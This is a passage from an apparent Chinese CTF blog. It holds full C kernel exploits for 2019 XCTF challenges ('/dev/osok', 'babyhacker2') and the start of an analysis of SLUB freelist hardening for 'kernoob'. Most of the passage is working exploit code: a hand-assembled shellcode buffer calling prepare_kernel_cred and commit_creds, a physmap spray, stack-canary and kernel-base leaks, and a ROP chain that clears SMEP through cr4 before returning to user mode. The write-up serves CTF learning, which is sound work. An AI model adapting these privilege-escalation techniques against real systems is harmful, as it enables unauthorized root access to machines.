class="line">    signal(SIGSEGV,get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/osok"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* shellcode = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    memset(shellcode,'\x90',0x100);</span><br><span class="line">    <span class="keyword">char</span>* tmp = shellcode;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0x9090</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = <span class="number">0x90ff3148</span>;</span><br><span class="line">    tmp += <span class="number">3</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xb848</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = prepare_kernel_cred;</span><br><span class="line">    tmp += <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xd0ff</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = <span class="number">0x90c78948</span>;</span><br><span class="line">    tmp += <span class="number">3</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xb848</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = commit_creds;</span><br><span class="line">    tmp += <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xd0ff</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tmp = <span class="number">0xf0c7c748</span>; <span class="comment">//mov rdi,0x6f0;</span></span><br><span class="line">    tmp += <span class="number">4</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)tmp = <span class="number">0x06</span>;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span>*)tmp = <span class="number">0x0</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span>*)tmp = <span class="number">0x220f</span>;  <span class="comment">//mov cr4,rdi;</span></span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0xe7</span>;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0x6a</span>;     <span class="comment">//push user_ss</span></span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)user_ss;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xB848</span>; <span class="comment">//push user_rsp</span></span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = user_rsp;</span><br><span class="line">    tmp += <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)tmp = <span class="string">'P'</span>; </span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0x68</span>;     <span class="comment">//push rflags</span></span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)tmp = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)user_rflags;</span><br><span class="line">    tmp += <span class="number">4</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0x6a</span>;     <span class="comment">//push user_cs</span></span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)user_cs;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0x68</span>;     <span class="comment">//push get_shell</span></span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)tmp = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)get_shell;</span><br><span class="line">    tmp += <span class="number">4</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span>*)tmp = <span class="number">0x010f</span>; <span class="comment">//swapgs;</span></span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0xf8</span>;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span>*)tmp = <span class="number">0xcf48</span>; <span class="comment">//iretq;</span></span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------------</span></span><br><span class="line">    <span class="keyword">char</span> * pp = mmap(<span class="number">0x100000</span>, <span class="number">0x10000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> i,num;</span><br><span class="line">	<span class="keyword">char</span> *mp;</span><br><span class="line">	<span class="keyword">char</span> *p;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; spray_times; i++)</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">if</span> ((p = mmap(<span class="literal">NULL</span>, mp_size, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span> )) == MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:(]mmap error..."</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">for</span> (num = <span class="number">0</span>; num &lt; <span class="number">64</span>; num++)</span><br><span class="line">		&#123;</span><br><span class="line">			mp = p + num * <span class="number">1024</span>;</span><br><span class="line">			*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;mp[<span class="number">0x30</span>]) = guess_physmap+<span class="number">0x40</span>; </span><br><span class="line">			*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;mp[<span class="number">0x20</span>]) = <span class="number">0xffffffff8153588e</span>; </span><br><span class="line">			*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;mp[<span class="number">0xe0</span>]) = <span class="number">0</span>;                  </span><br><span class="line">			*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;mp[<span class="number">0x8</span>]) = guess_physmap+<span class="number">0x70</span>;  </span><br><span class="line">             *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;mp[<span class="number">0x9e</span>]) = regcache_mark_dirty+<span class="number">1</span>;</span><br><span class="line">			*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;mp[<span class="number">0x70</span>]) = guess_physmap; <span class="comment">//set_memory_x first arg</span></span><br><span class="line">			*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;mp[<span class="number">0x60</span>]) = set_memory_x;</span><br><span class="line">			*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;mp[<span class="number">0x68</span>]) = guess_physmap+<span class="number">0x100</span>; <span class="comment">//return address</span></span><br><span class="line">			*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;mp[<span class="number">0x270</span>]) = <span class="number">0xffffffff810a9114</span>;</span><br><span class="line">			<span class="built_in">memcpy</span>(mp+<span class="number">0x100</span>,shellcode,<span class="number">0x100</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------------</span></span><br><span class="line">    user_ptr = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    user_ptr-&gt;rdi = guess_physmap;</span><br><span class="line">    user_ptr-&gt;rip = regcache_mark_dirty;</span><br><span class="line">    ioctl(fd,<span class="number">1337</span>,user_ptr);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   0xffffffff81608250:	push   rbx</span></span><br><span class="line"><span class="comment">   0xffffffff81608251:	mov    rbx,rdi</span></span><br><span class="line"><span class="comment">   0xffffffff81608251:	mov    rbx,rdi</span></span><br><span class="line"><span class="comment">   0xffffffff81608254:	mov    rdi,QWORD PTR [rdi+0x30]</span></span><br><span class="line"><span class="comment">   0xffffffff81608258:	mov    rax,QWORD PTR [rbx+0x20]</span></span><br><span class="line"><span class="comment">=&gt; 0xffffffff8160825c:	call   0xffffffff81e00f20</span></span><br><span class="line"><span class="comment">Guessed arguments:</span></span><br><span class="line"><span class="comment">arg[0]: 0xffff888007a72040 --&gt; 0x0 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">jmp rax  //rax = 0xffffffff8153588e </span></span><br><span class="line"><span class="comment">         //rdi = guest_phymap+0x40</span></span><br><span class="line"><span class="comment">         //rbx = guest_phymap</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">=&gt; 0xffffffff8153588e:	mov    rdx,QWORD PTR [rbx+0xe0]</span></span><br><span class="line"><span class="comment">   0xffffffff81535895:	mov    rsi,QWORD PTR [rbx+0x8]   //rsi = [guest_phymap+0x8] = guest_phymap+0x70</span></span><br><span class="line"><span class="comment">   0xffffffff81535899:	pop    rbx                       //rbx = xxx</span></span><br><span class="line"><span class="comment">   0xffffffff8153589a:	pop    rbp</span></span><br><span class="line"><span class="comment">   0xffffffff8153589b:	pop    r12</span></span><br><span class="line"><span class="comment">   0xffffffff8153589d:	mov    rax,QWORD PTR [rdi+0x230] //rax = [guest_phymap+0x270]</span></span><br><span class="line"><span class="comment">   0xffffffff815358a4:	jmp    0xffffffff81e00f20</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">jmp rax  //rax = 0xffffffff810a9114</span></span><br><span class="line"><span class="comment">         //rdi = phymap+0x40</span></span><br><span class="line"><span class="comment">         //rsi = phymap+0x70</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   0xffffffff810a9114:	sti    </span></span><br><span class="line"><span class="comment">   0xffffffff810a9115:	jmp    QWORD PTR [rsi+0x2e]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">jmp [phymap+0x9e] //0xffffffff81608251 </span></span><br><span class="line"><span class="comment">                  //rdi = phymap+0x40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">=&gt; 0xffffffff81608251:	mov    rbx,rdi</span></span><br><span class="line"><span class="comment">   0xffffffff81608254:	mov    rdi,QWORD PTR [rdi+0x30]</span></span><br><span class="line"><span class="comment">   0xffffffff81608258:	mov    rax,QWORD PTR [rbx+0x20]</span></span><br><span class="line"><span class="comment">   0xffffffff8160825c:	call   0xffffffff81e00f20</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p><a href="https://0xffff.one/d/346" target="_blank" rel="noopener">https://0xffff.one/d/346</a></p>
<h1 id="2019xctf新春战疫-babyhacker2"><a href="#2019xctf新春战疫-babyhacker2" class="headerlink" title="2019xctf新春战疫_babyhacker2"></a>2019xctf新春战疫_babyhacker2</h1><p>写<code>exp</code>十分钟，上传两小时。。。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rsp,user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">        <span class="string">"mov user_rsp,rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Save success!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/flag"</span>,<span class="number">0</span>);</span><br><span class="line">    read(fd,buf,<span class="number">0x50</span>);</span><br><span class="line">    write(<span class="number">1</span>,buf,<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> get_shell_addr = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">su</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"push user_ss;"</span></span><br><span class="line">        <span class="string">"push user_rsp;"</span></span><br><span class="line">        <span class="string">"push user_rflags;"</span></span><br><span class="line">        <span class="string">"push user_cs;"</span></span><br><span class="line">        <span class="string">"push get_shell_addr;"</span></span><br><span class="line">        <span class="string">"swapgs;"</span></span><br><span class="line">        <span class="string">"iretq;"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save();</span><br><span class="line">    signal(SIGSEGV,get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/babyhacker"</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* user_buf = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">    <span class="keyword">if</span>(user_buf == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]malloc error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,<span class="number">-1</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,user_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> vmbase = *((<span class="keyword">size_t</span>*)user_buf+<span class="number">42</span>);</span><br><span class="line">    vmbase -= <span class="number">0x219218</span>;</span><br><span class="line">    <span class="keyword">size_t</span> canary = *((<span class="keyword">size_t</span>*)user_buf+<span class="number">40</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]vmbase = %p\n"</span>,vmbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]canary = %p\n"</span>,canary);</span><br><span class="line">    prepare_kernel_cred = vmbase+<span class="number">0xa1820</span>;</span><br><span class="line">    commit_creds = vmbase+<span class="number">0xa1430</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//0xffffffff81004d70: mov cr4, rdi; pop rbp; ret; </span></span><br><span class="line">    <span class="comment">//0xffffffff8109054d: pop rdi; ret; </span></span><br><span class="line">    <span class="comment">//0xffffffff810636b4: swapgs; pop rbp; ret; </span></span><br><span class="line">    <span class="comment">//0xffffffff821d89f7: iretq; sub eax, 0xfffffec9; pop rbp; ret; </span></span><br><span class="line">    <span class="comment">//0xffffffff810def79: mov rdi, rax; call rdx;</span></span><br><span class="line">    <span class="comment">//0xffffffff81083f22: pop rdx; ret; </span></span><br><span class="line">    <span class="comment">//0xffffffff814d642f</span></span><br><span class="line">    memset(user_buf,'\x00',0x1000);</span><br><span class="line">    *((<span class="keyword">size_t</span>*)user_buf+<span class="number">0x140</span>/<span class="number">8</span>) = canary;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)user_buf+<span class="number">0x150</span>/<span class="number">8</span>) = vmbase+<span class="number">0x9054d</span>;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)user_buf+<span class="number">0x158</span>/<span class="number">8</span>) = <span class="number">0x6f0</span>;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)user_buf+<span class="number">0x160</span>/<span class="number">8</span>) = vmbase+<span class="number">0x4d70</span>;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)user_buf+<span class="number">0x168</span>/<span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">    *((<span class="keyword">size_t</span>*)user_buf+<span class="number">0x170</span>/<span class="number">8</span>) = (<span class="keyword">size_t</span>)su; </span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,user_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="2019xctf新春战疫-kernoob"><a href="#2019xctf新春战疫-kernoob" class="headerlink" title="2019xctf新春战疫_kernoob"></a>2019xctf新春战疫_kernoob</h1><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>这题当时比赛时我断断续续花了接近一天时间耗在上面，主要是因为方向一直不明确，有点像解<code>cookie</code>，又有点像<code>double fetch</code>，又听说有非预期。。。然后开始每一个都不坚定，后来决定尝试<code>double fetch</code>，但是我试了快一百次都没竞争成功一次，虽然理论是可以竞争成功的，但是我真的对这个方法的可行性产生了怀疑???，即使不考虑竞争因素可以出，这个概率也不知道什么时候可以跑出来。。。导致我的信念不是很坚定，最后一天晚上身体也顶不住，后来就被我爸吵着去睡觉了。。。</p>
<p>在赛中和<code>17</code>学长交流以及赛后学习其他队的<code>exp</code>的过程中，学到了很多姿势。。。</p>
<p>这题的预期解应该是<code>double fetch</code>，因为<code>flag</code>中含有<code>race</code>字样，但是这个概率是真的感人，看到除了直接看本地<code>flag</code>之外的正常解都是用的解<code>cookie</code>的方法，其中<code>Kirin</code>师傅的<code>wp</code>写的较为详细，让我学到了很多orz，跪谢。</p>
<p>首先是<code>chunk</code>的<code>fd</code>位置这个加密的来源如下：</p>
<blockquote>
<p>linux kernel 4.14 released this month;<br>Kees Cook: “a bunch of security features I’m excited about”<br>relevant PATCH 0: add a naive detection of double free or corruption 这个补丁, 在进行连续的kfree的时候会起作用终止当前进程. 但是如果在连续的kfree之间其他进程kfree了相邻的一些对象, 导致page-&gt;freelist改写, 补丁无作用.<br>relevant PATCH 1: add SLUB free list pointer obfuscation 这个补丁, 将写入对象首地址(s-&gt;offset=0)的数据进行异或, 在申请对象的时候进行逆运算得到下一个申请的对象的位置.<br>relevant PATCH 2: prefetch next freelist pointer in slab_alloc 这个补丁, 会在申请一个对象的时候, 得到下一个可以申请的对象的位置, 同时对下一个对象保存的异或数据进行逆运算, 然后检测那个位置是否合法.</p>
</blockquote>
<p>通过篡改<code>fd</code>指针产生的报错我们得知错误发生在<code>mm/slub.c</code>文件里，然后查看源码，进行分析。</p>
<p>查看<code>source/mm/slub.c</code>源码，在<code>freelist_ptr</code>函数中找到了<code>xor</code>加密的字样，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/********************************************************************</span></span><br><span class="line"><span class="comment"> * 			Core slab cache functions</span></span><br><span class="line"><span class="comment"> *******************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Returns freelist pointer (ptr). With hardening, this is obfuscated</span></span><br><span class="line"><span class="comment"> * with an XOR of the address where the pointer is held and a per-cache</span></span><br><span class="line"><span class="comment"> * random number.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="function"><span class="params">				 <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^ ptr_addr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后查看<code>__kmalloc</code>函数源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__kmalloc(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line">		<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"></span><br><span class="line">	s = kmalloc_slab(size, flags);                <span class="comment">//通过size获取对应的kmem_cache</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))</span><br><span class="line">		<span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">	ret = slab_alloc(s, flags, _RET_IP_);         <span class="comment">//通过kmem_cache获取指针</span></span><br><span class="line"></span><br><span class="line">	trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, flags);</span><br><span class="line"></span><br><span class="line">	kasan_kmalloc(s, ret, size, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;                                   <span class="comment">//将指针返回给用户</span></span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__kmalloc);</span><br></pre></td></tr></table></figure>
<p>在<code>source/mm/slab_common.c</code>中查看<code>kmalloc_slab</code>源码：</p>
